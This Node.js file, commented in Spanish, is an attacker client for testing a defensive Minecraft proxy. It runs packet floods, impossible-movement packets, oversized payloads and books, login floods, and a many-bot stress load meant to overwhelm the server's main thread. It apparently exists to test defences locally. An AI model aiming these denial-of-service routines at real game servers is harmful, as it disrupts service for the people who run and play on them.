// Cliente atacante para evaluar el proxy defensivo.
// Cada ataque se conecta a través del proxy (no directo al backend) y ejerce un
// patrón de abuso. Devuelve un resumen con lo enviado, el tiempo y si el proxy
// lo desconectó (señal de que el modo enforce actuó).

import { resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import protocol from 'minecraft-protocol';

const DEFAULTS = { host: '127.0.0.1', port: 25565, version: '26.1' };

function connectThroughProxy({ host, port, version, username }) {
  return protocol.createClient({ host, port, version, username, auth: 'offline', keepAlive: false });
}

// Espera a que el cliente llegue al estado play o falle antes.
function awaitPlay(client, timeoutMs = 20_000) {
  return new Promise((resolve, reject) => {
    const timer = setTimeout(() => reject(new Error('timeout esperando play')), timeoutMs);
    client.once('playerJoin', () => { clearTimeout(timer); resolve(); });
    client.once('end', reason => { clearTimeout(timer); reject(new Error(`cerrado antes de play: ${reason}`)); });
    client.once('error', error => { clearTimeout(timer); reject(error); });
  });
}

// Ejecuta un envío en play y reporta si el proxy desconectó durante el ataque.
async function duringPlay(options, sender) {
  const { host, port, version } = { ...DEFAULTS, ...options };
  const username = options.username ?? `atk_${Math.random().toString(36).slice(2, 8)}`;
  const client = connectThroughProxy({ host, port, version, username });

  let disconnected = false;
  let endReason;
  client.once('end', reason => { disconnected = true; endReason = reason; });
  client.on('error', () => {});

  await awaitPlay(client);
  const start = performance.now();
  const sent = await sender(client, () => disconnected);
  // Deja un margen para que una desconexión en vuelo llegue.
  await new Promise(resolve => setTimeout(resolve, 400));
  const elapsedMs = Math.round(performance.now() - start);
  if (!disconnected) client.end('fin del ataque');

  return { username, sent, elapsedMs, disconnected, endReason };
}

// 1. Inundación de paquetes: arm_animation a ritmo muy superior al normal.
export async function packetFlood(options = {}) {
  const count = options.count ?? 400;
  const summary = await duringPlay(options, (client, isDisconnected) => {
    let sent = 0;
    for (let i = 0; i < count; i++) {
      if (isDisconnected()) break;
      client.write('arm_animation', { hand: 'main_hand' });
      sent++;
    }
    return sent;
  });
  return { attack: 'packet_flood', count, ...summary };
}

// 2. Movimiento imposible: saltos de posición muy por encima de lo físico.
export async function impossibleMovement(options = {}) {
  const count = options.count ?? 10;
  const jump = options.jump ?? 1_000;
  const flags = { onGround: true, hasHorizontalCollision: false };
  const summary = await duringPlay(options, (client, isDisconnected) => {
    let sent = 0;
    client.write('position', { x: 0, y: 64, z: 0, flags });
    sent++;
    for (let i = 1; i <= count; i++) {
      if (isDisconnected()) break;
      client.write('position', { x: i * jump, y: 64, z: 0, flags });
      sent++;
    }
    return sent;
  });
  return { attack: 'impossible_movement', count, jump, ...summary };
}

// 3. Carga sobredimensionada: custom_payload y libro muy por encima del límite.
export async function oversizedPayload(options = {}) {
  const payloadBytes = options.payloadBytes ?? 200_000;
  const bookChars = options.bookChars ?? 300_000;
  const summary = await duringPlay(options, (client, isDisconnected) => {
    let sent = 0;
    client.write('custom_payload', { channel: 'minecraft:brand', data: Buffer.alloc(payloadBytes, 0x41) });
    sent++;
    if (!isDisconnected()) {
      client.write('edit_book', { hand: 0, pages: ['A'.repeat(bookChars)], title: undefined });
      sent++;
    }
    return sent;
  });
  return { attack: 'oversized_payload', payloadBytes, bookChars, ...summary };
}

// 4. Inundación de login: muchas conexiones nuevas en ráfaga.
export async function loginFlood(options = {}) {
  const { host, port, version } = { ...DEFAULTS, ...options };
  const count = options.count ?? 50;
  const start = performance.now();

  const results = await Promise.all(Array.from({ length: count }, (_, i) => new Promise(resolve => {
    const client = connectThroughProxy({ host, port, version, username: `flood_${i}` });
    let settled = false;
    const done = outcome => { if (settled) return; settled = true; try { client.end(); } catch {} resolve(outcome); };
    const timer = setTimeout(() => done('timeout'), 15_000);
    client.once('playerJoin', () => { clearTimeout(timer); done('joined'); });
    client.once('end', () => { clearTimeout(timer); done('ended'); });
    client.once('error', () => { clearTimeout(timer); done('error'); });
  })));

  const elapsedMs = Math.round(performance.now() - start);
  const tally = results.reduce((acc, outcome) => (acc[outcome] = (acc[outcome] ?? 0) + 1, acc), {});
  return { attack: 'login_flood', count, elapsedMs, outcomes: tally };
}

// 5. Estres del servidor: muchos bots concurrentes que entran, caminan hacia
// zonas nuevas forzando generacion de chunks y spamean acciones. Busca saturar
// el hilo principal (avisos "Can't keep up", y en el limite el watchdog de 60s).
export async function serverStress(options = {}) {
  const { host, port, version } = { ...DEFAULTS, ...options };
  const bots = options.bots ?? 40;
  const durationMs = (options.durationSec ?? 45) * 1000;
  const stepBlocks = options.step ?? 6;       // pasos cortos y continuos
  const deadline = Date.now() + durationMs;

  let joined = 0;
  let packets = 0;
  const start = performance.now();

  async function oneBot(index) {
    const username = `stress_${index}_${Math.random().toString(36).slice(2, 6)}`;
    const client = connectThroughProxy({ host, port, version, username });
    client.on('error', () => {});
    let alive = true;
    client.once('end', () => { alive = false; });

    try {
      await awaitPlay(client, 25_000);
    } catch {
      return;
    }
    joined++;

    const flags = { onGround: true, hasHorizontalCollision: false };
    let x = (index - bots / 2) * 512;          // cada bot en una franja distinta
    let z = 0;
    // Bucle de carga: avanza y spamea hasta el tiempo limite.
    while (alive && Date.now() < deadline) {
      z += stepBlocks;
      try {
        client.write('position', { x, y: 80, z, flags });
        client.write('arm_animation', { hand: 'main_hand' });
        client.write('block_dig', { status: 0, location: { x: Math.floor(x), y: 79, z: Math.floor(z) }, face: 1, sequence: 0 });
        packets += 3;
      } catch {
        break;
      }
      // ~20 iteraciones por segundo, como un cliente real a tope.
      await new Promise(r => setTimeout(r, 50));
    }
    if (alive) client.end('fin del estres');
  }

  await Promise.all(Array.from({ length: bots }, (_, i) => oneBot(i)));
  const elapsedMs = Math.round(performance.now() - start);
  return { attack: 'server_stress', bots, joined, packets, elapsedMs, sent: packets };
}

export const ATTACKS = {
  packet_flood: packetFlood,
  impossible_movement: impossibleMovement,
  oversized_payload: oversizedPayload,
  login_flood: loginFlood,
  server_stress: serverStress,
};

async function main() {
  const { parseArgs } = await import('node:util');
  const { values } = parseArgs({ options: {
    attack: { type: 'string' },
    host: { type: 'string', default: '127.0.0.1' },
    port: { type: 'string', default: '25565' },
    version: { type: 'string', default: '26.1' },
    count: { type: 'string' },
    bots: { type: 'string' },
    duration: { type: 'string' },
    step: { type: 'string' },
    help: { type: 'boolean', default: false },
  } });

  if (values.help || !values.attack) {
    process.stdout.write([
      'uso: node src/attacker.mjs --attack <nombre> [--host h] [--port p] [--count n]',
      `ataques: ${Object.keys(ATTACKS).join(', ')}`,
      'Apunta --port al proxy (25565), no al backend.',
      '',
    ].join('\n'));
    process.exit(values.attack ? 0 : 1);
  }

  const run = ATTACKS[values.attack];
  if (!run) { process.stderr.write(`ataque desconocido: ${values.attack}\n`); process.exit(1); }

  const options = { host: values.host, port: Number(values.port), version: values.version };
  if (values.count) options.count = Number(values.count);
  if (values.bots) options.bots = Number(values.bots);
  if (values.duration) options.durationSec = Number(values.duration);
  if (values.step) options.step = Number(values.step);

  const summary = await run(options);
  process.stdout.write(`${JSON.stringify(summary, null, 2)}\n`);
  process.exit(0);
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  main().catch(error => { process.stderr.write(`error: ${error.message}\n`); process.exit(1); });
}
